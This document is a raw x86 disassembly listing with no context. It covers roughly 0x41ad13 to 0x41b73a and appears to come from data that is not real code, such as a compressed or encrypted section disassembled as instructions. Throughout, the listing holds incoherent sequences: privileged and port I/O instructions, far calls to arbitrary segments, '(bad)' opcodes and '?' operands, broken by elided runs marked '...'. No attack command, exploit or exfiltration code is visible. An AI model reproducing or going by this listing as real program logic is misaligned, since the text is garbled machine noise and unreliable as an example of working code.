  41ad13:	jne    0x41ad60
  41ad15:	xchg   ecx,eax
  41ad16:	or     bh,cl
  41ad18:	pop    ebx
  41ad19:	mov    edx,0xd52cc5be
  41ad1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad1f:	mov    dl,0xf
  41ad21:	dec    eax
  41ad22:	dec    ebp
  41ad23:	xor    al,0xed
  41ad25:	ror    DWORD PTR [ebx*4+0x679de353],0xa
  41ad2d:	sub    al,0x5
  41ad2f:	xor    eax,edx
  41ad31:	pop    es
  41ad32:	test   eax,0xc9a603a5
  41ad37:	mov    ebx,0x3ad388de
  41ad3c:	xchg   ebx,eax
  41ad3d:	jno    0x41ad87
  41ad3f:	shl    DWORD PTR [ecx+0x2a],1
  41ad42:	iret   
  41ad43:	pop    esi
  41ad44:	sahf   
  41ad45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad46:	cs shl esi,1
  41ad49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad4a:	mov    ch,BYTE PTR [esi]
  41ad4c:	lea    edx,[ebx-0x33190e91]
  41ad52:	test   eax,0x870b870c
  41ad57:	loopne 0x41ad4c
  41ad59:	adc    esp,ebx
  41ad5b:	ins    BYTE PTR es:[edi],dx
  41ad5c:	imul   esp,DWORD PTR [ebx+0x35c94b78],0x52
  41ad63:	imul   ebp,DWORD PTR ss:[ecx+0x7792cb80],0xffffff8e
  41ad6b:	loop   0x41ad9c
  41ad6d:	call   0xd5fd:0xf0812f79
  41ad74:	lds    esp,FWORD PTR [esi]
  41ad76:	inc    esi
  41ad77:	out    dx,al
  41ad78:	test   eax,0xbf1afca0
  41ad7d:	sti    
  41ad7e:	adc    BYTE PTR [ecx],0x5f
  41ad81:	imul   ecx,esp,0x98d8603a
  41ad87:	or     DWORD PTR [ebp-0x6ba6cfb7],ebx
  41ad8d:	pop    ebp
  41ad8e:	icebp  
  41ad8f:	xchg   BYTE PTR [edx+0x0],dl
	...
  41adf2:	add    BYTE PTR [eax],al
  41adf4:	push   ebp
  41adf5:	clc    
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [esi+ecx*8+0x4e31fb3c],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	ss mov al,0x2d
  41ae0f:	sete   BYTE PTR [ebx-0x41dbb2a6]
  41ae16:	fadd   QWORD PTR [ebx+0x6b80a6d]
  41ae1c:	daa    
  41ae1d:	inc    esi
  41ae1e:	add    eax,0xaffb3568
  41ae23:	xchg   ebp,eax
  41ae24:	jns    0x41ada7
  41ae26:	les    edx,FWORD PTR [edx*2+0x4ab24735]
  41ae2d:	add    ebx,DWORD PTR [ebx+ecx*4]
  41ae30:	mov    ch,0x2a
  41ae32:	cmp    BYTE PTR [edx+0x2efea87b],0x9b
  41ae39:	ret    
  41ae3a:	dec    edx
  41ae3b:	push   ebx
  41ae3c:	bt     DWORD PTR [ecx+0x50],0x16
  41ae41:	pop    ds
  41ae42:	add    ah,ah
  41ae44:	pop    edi
  41ae45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae46:	imul   edi,DWORD PTR ds:0xb0c2631d,0xcd6065ae
  41ae50:	test   bl,bl
  41ae52:	or     eax,0x673fa4cf
  41ae57:	imul   esp,DWORD PTR [edi],0x8a10e56e
  41ae5d:	dec    ecx
  41ae5e:	inc    ecx
  41ae5f:	add    al,ah
  41ae61:	fst    QWORD PTR [edx+eiz*1+0x75f4d9f2]
  41ae68:	loope  0x41ae1d
  41ae6a:	xchg   BYTE PTR [ebp-0x1704d04],bl
  41ae70:	mov    ah,0x28
  41ae72:	pop    es
  41ae73:	into   
  41ae74:	mov    dh,0xbc
  41ae76:	xchg   ebx,eax
  41ae77:	or     dl,BYTE PTR [ebx-0xe]
  41ae7a:	sti    
  41ae7b:	or     esp,eax
  41ae7d:	leavew 
  41ae7f:	jb     0x41aea6
  41ae81:	ret    
  41ae82:	add    DWORD PTR [esi-0x4feed3c2],eax
  41ae88:	loop   0x41aec7
  41ae8a:	inc    esi
  41ae8b:	or     DWORD PTR [edx+0x5d],eax
  41ae8e:	dec    ebx
  41ae8f:	lock mov bl,0x8d
  41ae92:	jo     0x41ae51
  41ae94:	sub    al,BYTE PTR [esi]
  41ae96:	xor    BYTE PTR [ebx+0x7250fd8e],dl
  41ae9c:	repz dec ebx
  41ae9e:	and    BYTE PTR ds:0xb61ec39e,ah
  41aea4:	adc    eax,0x9b279aea
  41aea9:	sahf   
  41aeaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeab:	mov    al,0x37
  41aead:	sub    eax,0x2667e01d
  41aeb2:	pop    esi
  41aeb3:	sub    BYTE PTR [esi],bh
  41aeb5:	sub    eax,0x51222405
  41aeba:	shl    BYTE PTR [edi],1
  41aebc:	sub    dh,BYTE PTR [ecx+0x24cc38c6]
  41aec2:	(bad)  
  41aec3:	jne    0x41aec8
  41aec5:	pop    edx
  41aec6:	scas   eax,DWORD PTR es:[edi]
  41aec7:	dec    esp
  41aec8:	mov    ?,WORD PTR [ebx-0x111c5d8d]
  41aece:	pop    ebp
  41aecf:	imul   ebx,DWORD PTR [esi-0x2e],0x953c3ad8
  41aed6:	pop    ds
  41aed7:	mov    al,ds:0x46e34e91
  41aedc:	dec    edi
  41aedd:	push   ds
  41aede:	gs jns 0x41aea1
  41aee1:	adc    dh,BYTE PTR gs:[eax-0x79364cb5]
  41aee8:	scas   eax,DWORD PTR es:[edi]
  41aee9:	add    al,0x7
  41aeeb:	and    ebx,DWORD PTR [edx]
  41aeed:	std    
  41aeee:	mov    ebx,DWORD PTR [esp+edx*4]
  41aef1:	rol    DWORD PTR ds:0x69a755e7,0x7e
  41aef8:	ror    ah,cl
  41aefa:	xchg   ebx,eax
  41aefb:	xor    esp,DWORD PTR [eax-0x5afe75e3]
  41af01:	arpl   sp,bp
  41af03:	add    esp,edx
  41af05:	aaa    
  41af06:	mov    esp,0xa999de90
  41af0b:	and    eax,0xbd16df2b
  41af10:	rol    DWORD PTR [eax],0x0
	...
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x2c6244ee
  41af82:	les    edi,FWORD PTR [esi+0x11e53]
  41af88:	add    eax,0x56000001
  41af8d:	pop    esi
  41af8e:	push   ds
  41af8f:	dec    ebp
  41af90:	sub    ecx,eax
  41af92:	(bad)  
  41af93:	pushf  
  41af94:	fistp  DWORD PTR ds:0xa6ec5bc1
  41af9a:	fadd   DWORD PTR [ebp+eiz*2-0x4e5aa49a]
  41afa1:	js     0x41af9a
  41afa3:	sub    bl,bl
  41afa5:	mov    esp,0xa590a553
  41afaa:	or     eax,0xfa0fb342
  41afaf:	stc    
  41afb0:	cli    
  41afb1:	in     al,0x73
  41afb3:	pop    es
  41afb4:	in     al,dx
  41afb5:	jge    0x41b02b
  41afb7:	push   ebx
  41afb8:	int    0x51
  41afba:	out    0x2d,eax
  41afbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afbd:	sbb    eax,0x19f976bb
  41afc2:	(bad)  
  41afc3:	test   eax,0xf6696a2d
  41afc8:	lods   al,BYTE PTR ds:[esi]
  41afc9:	jmp    0x5006:0xe8407f62
  41afd0:	loope  0x41b00c
  41afd2:	aam    0xc2
  41afd4:	pop    ds
  41afd5:	sbb    al,0xf1
  41afd7:	ins    BYTE PTR es:[edi],dx
  41afd8:	rcr    bh,cl
  41afda:	jl     0x41af76
  41afdc:	push   esi
  41afdd:	pop    ebp
  41afde:	nop
  41afdf:	sub    esi,DWORD PTR [esi-0x50]
  41afe2:	ja     0x41b016
  41afe4:	push   0xffffffac
  41afe6:	pop    esi
  41afe7:	aam    0x44
  41afe9:	pop    eax
  41afea:	fwait
  41afeb:	ins    DWORD PTR es:[edi],dx
  41afec:	lods   eax,DWORD PTR ds:[esi]
  41afed:	inc    edx
  41afee:	sub    DWORD PTR [edx+ebx*8+0x1b],ebp
  41aff2:	push   0x5a
  41aff4:	or     BYTE PTR [edx],bl
  41aff6:	stos   BYTE PTR es:[edi],al
  41aff7:	ret    0xa9ba
  41affa:	pop    es
  41affb:	loop   0x41afa3
  41affd:	jg     0x41afd1
  41afff:	outs   dx,DWORD PTR ds:[esi]
  41b000:	(bad)  
  41b001:	xlat   BYTE PTR ds:[ebx]
  41b002:	imul   ecx,DWORD PTR ds:[ebx-0x1cc08e88],0x886c42c5
  41b00d:	xchg   esi,eax
  41b00e:	xor    edi,edx
  41b010:	in     eax,dx
  41b011:	push   es
  41b012:	fcom   DWORD PTR [ebp+0x71]
  41b015:	clc    
  41b016:	push   ebx
  41b017:	(bad)  [edi+0x13]
  41b01a:	in     al,dx
  41b01b:	and    al,0x60
  41b01d:	mov    DWORD PTR [edi+edi*2-0x22825afd],ebx
  41b024:	test   DWORD PTR [ebx],eax
  41b026:	hlt    
  41b027:	iret   
  41b028:	mov    ebp,0x66a12b1f
  41b02d:	call   0x2a6e0089
  41b032:	jl     0x41b0a5
  41b034:	scas   al,BYTE PTR es:[edi]
  41b035:	cld    
  41b036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b037:	imul   ebp,DWORD PTR [ebp-0x859ab4b],0x1f
  41b03e:	fmul   QWORD PTR gs:[ecx+ebx*1+0x6a1ec3f]
  41b046:	cmp    DWORD PTR ds:0x664803e1,0x449be1a2
  41b050:	push   eax
  41b051:	fs cmp eax,0xc779705c
  41b057:	aaa    
  41b058:	shr    DWORD PTR [ecx-0x76],0x21
  41b05c:	push   0x53
  41b05e:	mov    ds:0x22527da1,eax
  41b063:	push   esp
  41b064:	add    eax,0xf7eb6033
  41b069:	imul   ebx,DWORD PTR [eax],0x5b416526
  41b06f:	(bad)  
  41b071:	mov    ds:0x65e4b509,eax
  41b076:	mov    WORD PTR [eax+0x1d],cs
  41b079:	jecxz  0x41b03f
  41b07b:	mov    ds:0xc0ee156e,eax
  41b080:	daa    
  41b081:	sub    BYTE PTR [ecx+eiz*8+0x7fcbfac],ah
  41b088:	dec    edi
  41b089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b08a:	cmp    esi,DWORD PTR [ebp-0x36]
  41b08d:	jo     0x41b01b
  41b08f:	mov    ds:0x55,al
	...
  41b0f4:	(bad)  
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x14eb515f
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0xc8000001
  41b10d:	adc    ebx,edi
  41b10f:	pop    edx
  41b110:	pop    ds
  41b111:	push   edx
  41b112:	jl     0x41b160
  41b114:	hlt    
  41b115:	push   eax
  41b116:	push   ebx
  41b117:	pop    es
  41b118:	or     eax,0xac119f05
  41b11d:	xchg   edi,eax
  41b11e:	imul   BYTE PTR [ecx+0x2c]
  41b121:	aaa    
  41b122:	or     DWORD PTR [esi-0x461ab40f],eax
  41b128:	(bad)  
  41b129:	push   ss
  41b12a:	in     al,dx
  41b12b:	push   es
  41b12c:	mov    eax,ds:0x5ea2f85a
  41b131:	push   ecx
  41b132:	pop    edi
  41b133:	sahf   
  41b134:	mov    ds:0xaad5dce6,eax
  41b139:	rcr    ah,cl
  41b13b:	aaa    
  41b13c:	popa   
  41b13d:	in     al,dx
  41b13e:	xor    BYTE PTR [ebp-0x65af6904],al
  41b144:	cmp    DWORD PTR ds:0x41c6373f,esp
  41b14a:	neg    BYTE PTR [eax+0x28]
  41b14d:	sub    BYTE PTR [ecx+0xcd288d],bl
  41b153:	loop   0x41b1c5
  41b155:	jl     0x41b13d
  41b157:	mov    esi,0xa6981843
  41b15c:	mov    ch,0x21
  41b15e:	add    al,0xd5
  41b160:	ret    
  41b161:	cwde   
  41b162:	arpl   WORD PTR [edi],bp
  41b164:	push   ebx
  41b165:	jecxz  0x41b153
  41b167:	cld    
  41b168:	adc    BYTE PTR [ebx-0x77d3fc99],ch
  41b16e:	jno    0x41b1b5
  41b170:	dec    edi
  41b171:	pop    edx
  41b172:	mov    al,BYTE PTR [edx+0x2cb9888f]
  41b178:	shl    BYTE PTR [ebx],0xfe
  41b17b:	inc    edi
  41b17c:	in     eax,0x36
  41b17e:	mov    ds:0x278ed5a5,eax
  41b183:	cld    
  41b184:	lock xor al,0x93
  41b187:	sti    
  41b188:	call   0x95d99238
  41b18d:	cmp    DWORD PTR [esi+0xf292725],ecx
  41b193:	jge    0x41b154
  41b195:	cs pop esi
  41b197:	enter  0xbea4,0x84
  41b19b:	aam    0xee
  41b19d:	pop    ecx
  41b19e:	pop    esi
  41b19f:	cwde   
  41b1a0:	in     eax,dx
  41b1a1:	jne    0x41b191
  41b1a3:	xor    eax,0x52efae31
  41b1a8:	in     al,0x41
  41b1aa:	fmul   DWORD PTR [edx+0x0]
  41b1ad:	sti    
  41b1ae:	test   bh,ah
  41b1b0:	in     al,0xab
  41b1b2:	out    dx,eax
  41b1b3:	fwait
  41b1b4:	ss dec esi
  41b1b6:	fdivr  DWORD PTR [ecx]
  41b1b8:	test   edi,0x23e0d8f
  41b1be:	fadd   st,st(3)
  41b1c0:	mov    dl,0x6a
  41b1c2:	mov    eax,ds:0x72a59de7
  41b1c7:	call   0x1144:0xc780f12d
  41b1ce:	jne    0x41b18d
  41b1d0:	sub    ah,BYTE PTR ds:0xa133e79d
  41b1d6:	mov    cs,WORD PTR [eax-0x6a]
  41b1d9:	sbb    al,0x39
  41b1db:	jg     0x41b1cc
  41b1dd:	mov    al,BYTE PTR [edx]
  41b1df:	mov    DWORD PTR [esp+ebp*2],ebx
  41b1e2:	retf   
  41b1e3:	js     0x41b1c4
  41b1e5:	xchg   esi,eax
  41b1e6:	ss push 0xebced15b
  41b1ec:	in     al,0xbc
  41b1ee:	pop    edx
  41b1ef:	or     eax,0x1f688c04
  41b1f4:	in     eax,dx
  41b1f5:	xor    ebp,DWORD PTR [ebx-0x25]
  41b1f8:	int3   
  41b1f9:	push   ds
  41b1fa:	fmul   DWORD PTR [edi-0x29]
  41b1fd:	mov    BYTE PTR [ecx+0x35],dl
  41b200:	nop
  41b201:	out    0x56,al
  41b203:	dec    eax
  41b204:	push   es
  41b205:	pop    ebx
  41b206:	rcl    BYTE PTR [ecx+0x1d],0x55
  41b20a:	es push esi
  41b20c:	push   cs
  41b20d:	adc    eax,0x4fa59c
	...
  41b272:	add    BYTE PTR [eax],al
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ecx],dl
  41b281:	test   al,0x27
  41b283:	sbb    DWORD PTR [ebp+0x20],0x1
  41b287:	add    BYTE PTR ds:0x5a000001,al
  41b28d:	or     BYTE PTR [esi-0x7],bl
  41b290:	jmp    0x7ae78b4
  41b295:	data16 in al,dx
  41b297:	cs push eax
  41b299:	xchg   esi,eax
  41b29a:	retf   
  41b29b:	xchg   esp,eax
  41b29c:	and    cl,BYTE PTR [esi]
  41b29e:	sar    DWORD PTR [edx],0x36
  41b2a1:	enter  0xaeae,0x65
  41b2a5:	test   eax,0x2a27d9a7
  41b2aa:	mov    DWORD PTR [edi+0x6d],esi
  41b2ad:	and    eax,0xf79a7d1f
  41b2b2:	mov    edi,0x675d86bf
  41b2b7:	cwde   
  41b2b8:	jnp    0x41b2b0
  41b2ba:	jmp    0xec781efc
  41b2bf:	add    DWORD PTR [eax+0x430ce4f6],eax
  41b2c5:	jne    0x41b291
  41b2c7:	inc    edx
  41b2c8:	push   edi
  41b2c9:	dec    edi
  41b2ca:	retf   0xde23
  41b2cd:	inc    ebp
  41b2ce:	jl     0x41b255
  41b2d0:	pop    esp
  41b2d1:	add    edx,DWORD PTR [eax]
  41b2d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2d4:	dec    ebx
  41b2d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2d6:	call   0x529b9658
  41b2db:	mov    al,BYTE PTR [eax+esi*1-0x5e]
  41b2df:	jmp    0x41b319
  41b2e1:	inc    esi
  41b2e2:	xchg   esi,eax
  41b2e3:	stc    
  41b2e4:	das    
  41b2e5:	cwde   
  41b2e6:	stc    
  41b2e7:	add    al,0x80
  41b2e9:	in     eax,0xe6
  41b2eb:	dec    edi
  41b2ec:	push   es
  41b2ed:	adc    ebp,DWORD PTR [edx+0x32edf9cd]
  41b2f3:	adc    eax,0xfa88549c
  41b2f8:	out    0xd,eax
  41b2fa:	daa    
  41b2fb:	rol    eax,cl
  41b2fd:	pop    ds
  41b2fe:	inc    edx
  41b2ff:	push   cs
  41b300:	mov    eax,esp
  41b302:	sbb    dl,BYTE PTR ds:0x20c438ef
  41b308:	pop    ebx
  41b309:	inc    edx
  41b30a:	mov    ds:0xf072556e,al
  41b30f:	fwait
  41b310:	xchg   BYTE PTR [ebx+0x56],dh
  41b313:	jae    0x41b314
  41b315:	test   eax,0x85056be0
  41b31a:	cmp    edx,ecx
  41b31c:	sub    al,0x1c
  41b31e:	mov    cl,ch
  41b320:	ds inc ecx
  41b322:	mov    dh,0x9e
  41b324:	retf   
  41b325:	add    al,0xde
  41b327:	mul    ebx
  41b329:	(bad)  
  41b32a:	mov    eax,0x32a73671
  41b32f:	out    dx,al
  41b330:	or     al,0x5d
  41b332:	out    0xdf,al
  41b334:	and    eax,0xa1e220bb
  41b339:	jo     0x41b30c
  41b33b:	(bad)  
  41b33c:	jns    0x41b330
  41b33e:	jmp    0x7f3c2da9
  41b343:	lods   al,BYTE PTR ds:[esi]
  41b344:	xchg   ecx,eax
  41b345:	ret    
  41b346:	mov    bh,0x70
  41b348:	add    al,0x5a
  41b34a:	es call 0xf973:0x789e62a7
  41b352:	adc    BYTE PTR [eax-0x5de6cdb],dh
  41b358:	xchg   edi,eax
  41b359:	mov    ch,0x45
  41b35b:	fwait
  41b35c:	push   edi
  41b35d:	jne    0x41b33a
  41b35f:	mov    edi,0x351c8bd
  41b364:	xchg   ebp,edi
  41b366:	xor    al,0x76
  41b368:	push   edx
  41b369:	fimul  WORD PTR [eax]
  41b36b:	dec    ebp
  41b36c:	retf   
  41b36d:	adc    ecx,DWORD PTR [ebx-0x61f1ed84]
  41b373:	cmp    BYTE PTR [edx-0x1f],al
  41b376:	push   es
  41b377:	out    0x80,eax
  41b379:	inc    ecx
  41b37a:	pop    ds
  41b37b:	mov    eax,ds:0xf218bdb7
  41b380:	(bad)  
  41b381:	and    bh,BYTE PTR [edi+0x3a]
  41b384:	fwait
  41b385:	and    BYTE PTR [ecx+0x23ea69dd],ah
  41b38b:	jns    0x41b3e1
  41b38d:	fdivr  QWORD PTR ds:0x116f
	...
  41b3f3:	add    BYTE PTR [eax+0xd],cl
  41b3f6:	sbb    eax,0xfebb5dab
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	in     eax,dx
  41b401:	dec    esp
  41b402:	retf   
  41b403:	in     eax,dx
  41b404:	bound  esp,QWORD PTR [ecx]
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    eax,0xe3000001
  41b40d:	jns    0x41b48d
  41b40f:	jmp    0x33195698
  41b414:	lea    esp,[ebp+esi*8+0x7a6ae1b6]
  41b41b:	jae    0x41b3bf
  41b41d:	outs   dx,BYTE PTR ds:[esi]
  41b41e:	jge    0x41b3da
  41b420:	inc    edx
  41b421:	xor    DWORD PTR [ebx],edi
  41b423:	xor    esp,edi
  41b425:	jp     0x41b424
  41b427:	(bad)  
  41b428:	mov    BYTE PTR [ebx+ebp*8-0x5fdbf033],al
  41b42f:	xchg   DWORD PTR [ecx+0x524296d6],eax
  41b435:	add    eax,0x8b97ae9f
  41b43a:	or     dl,BYTE PTR [esi]
  41b43c:	icebp  
  41b43d:	scas   eax,DWORD PTR es:[edi]
  41b43e:	iret   
  41b43f:	leave  
  41b440:	cs daa 
  41b442:	mov    edx,ds
  41b444:	sub    BYTE PTR [ebx+0x1a16f516],al
  41b44a:	cs test al,0x21
  41b44d:	fs inc esi
  41b44f:	sub    eax,0x4150f333
  41b454:	mov    cl,0x2f
  41b456:	dec    ecx
  41b457:	(bad)  
  41b458:	in     al,0xcc
  41b45a:	sub    bl,dh
  41b45c:	outs   dx,BYTE PTR ds:[esi]
  41b45d:	ss ja  0x41b402
  41b460:	outs   dx,BYTE PTR ds:[esi]
  41b461:	repz test al,0x2d
  41b464:	cmp    BYTE PTR [ebp-0x14738670],al
  41b46a:	add    DWORD PTR [eax],edx
  41b46c:	rol    ebx,cl
  41b46e:	push   eax
  41b46f:	pop    ebp
  41b470:	pop    ebp
  41b471:	gs jecxz 0x41b435
  41b474:	xor    DWORD PTR ds:0xda80bc8,edi
  41b47a:	adc    al,0xa1
  41b47c:	retf   0x1bb3
  41b47f:	sbb    eax,0x241935df
  41b484:	mov    ch,0xf3
  41b486:	sub    ch,BYTE PTR [eax+eiz*2]
  41b489:	test   BYTE PTR [eax-0x1e52f8f8],cl
  41b48f:	xchg   dl,al
  41b491:	int3   
  41b492:	push   es
  41b493:	dec    ebp
  41b494:	pop    edx
  41b495:	popf   
  41b496:	xchg   edi,eax
  41b497:	in     eax,0x7c
  41b499:	adc    dl,BYTE PTR ds:0x5e1ebfc9
  41b49f:	imul   eax,DWORD PTR [ecx],0x3d91ed10
  41b4a5:	jo     0x41b4cf
  41b4a7:	sbb    al,0x8c
  41b4a9:	loop   0x41b450
  41b4ab:	cmp    esp,eax
  41b4ad:	mov    WORD PTR [edx-0x24],ss
  41b4b0:	iret   
  41b4b1:	and    al,0x4
  41b4b3:	(bad)  
  41b4b4:	cmp    BYTE PTR [eax-0x3e],dl
  41b4b7:	push   ebx
  41b4b8:	stc    
  41b4b9:	call   0x265ae5a6
  41b4be:	cs das 
  41b4c0:	add    DWORD PTR [edx+0xc],edx
  41b4c3:	lock sbb edi,DWORD PTR [edx+0x32640cab]
  41b4ca:	in     al,0xcd
  41b4cc:	jge    0x41b524
  41b4ce:	aad    0x2f
  41b4d0:	xchg   ebp,eax
  41b4d1:	jl     0x41b458
  41b4d3:	cmp    DWORD PTR ds:[ecx+eax*1+0x353fa423],0xfffffff4
  41b4dc:	xor    al,0x80
  41b4de:	or     ecx,edi
  41b4e0:	bound  eax,QWORD PTR [eax+0x5d743349]
  41b4e6:	sub    BYTE PTR [edx+ecx*1],0x54
  41b4ea:	pop    ss
  41b4eb:	xor    BYTE PTR [edx],bl
  41b4ed:	pushf  
  41b4ee:	adc    bh,BYTE PTR [esi-0x51]
  41b4f1:	pushf  
  41b4f2:	or     al,cl
  41b4f4:	adc    esp,DWORD PTR [esp+ebp*1+0x58]
  41b4f8:	imul   ebp,DWORD PTR [edi],0xc97caf30
  41b4fe:	pop    ebp
  41b4ff:	cld    
  41b500:	loope  0x41b4e3
  41b502:	and    ch,cl
  41b504:	das    
  41b505:	push   esp
  41b506:	dec    edi
  41b507:	fst    QWORD PTR [ebx-0x346a6b00]
  41b50d:	sbb    al,0x47
  41b50f:	inc    ecx
  41b510:	and    al,0x0
	...
  41b572:	add    BYTE PTR [eax],al
  41b574:	aam    0xec
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	adc    al,0x2d
  41b582:	sub    cl,BYTE PTR [edi]
  41b584:	and    al,BYTE PTR [bx+di]
  41b587:	add    BYTE PTR ds:0x8b000001,al
  41b58d:	jne    0x41b530
  41b58f:	push   0xffffffc3
  41b591:	test   DWORD PTR [edi],ebp
  41b593:	stos   BYTE PTR es:[edi],al
  41b594:	xchg   BYTE PTR [esi+0x6c],bh
  41b597:	xchg   esi,eax
  41b598:	ins    DWORD PTR es:[edi],dx
  41b599:	adc    BYTE PTR [ecx+0x75],0xfc
  41b59d:	or     edx,DWORD PTR [edi+0x2686de8a]
  41b5a3:	xlat   BYTE PTR ds:[ebx]
  41b5a4:	or     al,0x5b
  41b5a6:	jnp    0x41b5c9
  41b5a8:	pop    ebp
  41b5a9:	sbb    eax,0xfad2707f
  41b5ae:	and    bh,BYTE PTR [ebp-0x6e]
  41b5b1:	xchg   esi,eax
  41b5b2:	clc    
  41b5b3:	es scas al,BYTE PTR es:[edi]
  41b5b5:	popf   
  41b5b6:	ins    DWORD PTR es:[edi],dx
  41b5b7:	fst    QWORD PTR [esi]
  41b5ba:	in     al,0x37
  41b5bc:	xchg   ebx,eax
  41b5bd:	aas    
  41b5be:	dec    ebp
  41b5bf:	sar    cl,cl
  41b5c1:	ret    
  41b5c2:	mov    WORD PTR [edi+0x7f],?
  41b5c5:	sub    eax,0x526e8dc2
  41b5ca:	dec    ecx
  41b5cb:	int    0xae
  41b5cd:	cmp    edx,eax
  41b5cf:	or     DWORD PTR [edx],0xffffffb5
  41b5d2:	data16 xor al,dh
  41b5d5:	fstp   TBYTE PTR [edi]
  41b5d7:	jae    0x41b5e0
  41b5d9:	mov    ebp,0xfaffcf28
  41b5de:	jge    0x41b583
  41b5e0:	pop    esp
  41b5e1:	push   esp
  41b5e2:	loope  0x41b590
  41b5e4:	dec    ebp
  41b5e5:	xchg   ebx,eax
  41b5e6:	fwait
  41b5e7:	push   esp
  41b5e8:	sar    DWORD PTR [edx-0x69b4b746],cl
  41b5ee:	xor    al,ch
  41b5f0:	and    eax,0x1faf4341
  41b5f5:	jmp    0x41b64e
  41b5f7:	jns    0x41b57b
  41b5f9:	sbb    eax,0x54a2935b
  41b5fe:	add    BYTE PTR [ebx+0x36],cl
  41b601:	arpl   WORD PTR [ebx],sp
  41b603:	gs dec edx
  41b605:	dec    edi
  41b606:	add    DWORD PTR [esi+0x4a],ecx
  41b609:	ss cmp al,0x83
  41b60c:	clc    
  41b60d:	or     DWORD PTR fs:[ebp-0x3],0xffffffe0
  41b612:	and    edi,DWORD PTR [esi+ebp*4]
  41b615:	pop    edx
  41b616:	sbb    eax,0xb6d4bb96
  41b61b:	out    0x2,al
  41b61d:	cmp    esp,edx
  41b61f:	(bad)  
  41b620:	std    
  41b621:	das    
  41b622:	inc    ecx
  41b623:	fidiv  WORD PTR ds:0x39ed6a31
  41b629:	xchg   edx,eax
  41b62a:	mov    bl,BYTE PTR [ebx]
  41b62c:	js     0x41b607
  41b62e:	mov    cl,0xa7
  41b630:	push   cs
  41b631:	mov    bl,0x99
  41b633:	or     ebp,ebx
  41b635:	sub    bh,dh
  41b637:	loope  0x41b5c0
  41b639:	enter  0x29d6,0x19
  41b63d:	popa   
  41b63e:	jno    0x41b67c
  41b640:	or     BYTE PTR [eax-0x1b8ac0f1],bh
  41b646:	ror    DWORD PTR [ecx+0x1f],cl
  41b649:	mov    al,bl
  41b64b:	dec    esi
  41b64c:	jl     0x41b6cb
  41b64e:	xchg   edx,eax
  41b64f:	arpl   WORD PTR [ebx+0x31],sp
  41b652:	adc    eax,0xac7067ce
  41b657:	add    cl,BYTE PTR [edx-0x628fad60]
  41b65d:	mov    ebp,0x445626d7
  41b662:	pushf  
  41b663:	and    eax,0xa10a08e9
  41b668:	lock call 0xa09e49bd
  41b66e:	scas   eax,DWORD PTR es:[edi]
  41b66f:	cmc    
  41b670:	hlt    
  41b671:	hlt    
  41b672:	pop    ecx
  41b673:	sti    
  41b674:	pop    ecx
  41b675:	sbb    ch,bl
  41b677:	addr16 ja 0x41b6a4
  41b67a:	jg     0x41b656
  41b67c:	es enter 0xcd7f,0x30
  41b681:	(bad)  
  41b682:	mov    ch,0xf7
  41b684:	push   ecx
  41b685:	ficom  DWORD PTR [edx]
  41b687:	adc    eax,edx
  41b689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b68a:	mov    eax,DWORD PTR [ebp-0xc5a90a3]
  41b690:	add    BYTE PTR cs:[eax],al
	...
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	push   edi
  41b701:	cmp    ecx,DWORD PTR [eax]
  41b703:	xlat   BYTE PTR ds:[ebx]
  41b704:	ins    BYTE PTR es:[edi],dx
  41b705:	and    eax,DWORD PTR [ecx]
  41b707:	add    BYTE PTR ds:0x50000001,al
  41b70d:	aam    0xd7
  41b70f:	push   esi
  41b710:	loope  0x41b69a
  41b712:	mov    edx,0xf24087c2
  41b717:	fadd   st(2),st
  41b719:	adc    edi,ebp
  41b71b:	or     DWORD PTR [esi],edx
  41b71d:	out    0xd5,al
  41b71f:	test   BYTE PTR [eax],dl
  41b721:	shr    dl,0xb9
  41b724:	leave  
  41b725:	xlat   BYTE PTR ds:[ebx]
  41b726:	inc    ebp
  41b727:	out    dx,al
  41b728:	xchg   dl,bl
  41b72a:	pop    edx
  41b72b:	xchg   ecx,eax
  41b72c:	jne    0x41b6fa
  41b72e:	outs   dx,DWORD PTR ds:[esi]
  41b72f:	mov    ah,0x1d
  41b731:	retf   
  41b732:	pop    es
  41b733:	jo     0x41b742
  41b735:	add    BYTE PTR [edx+esi*2-0x77],0xb8
  41b73a:	(bad)  
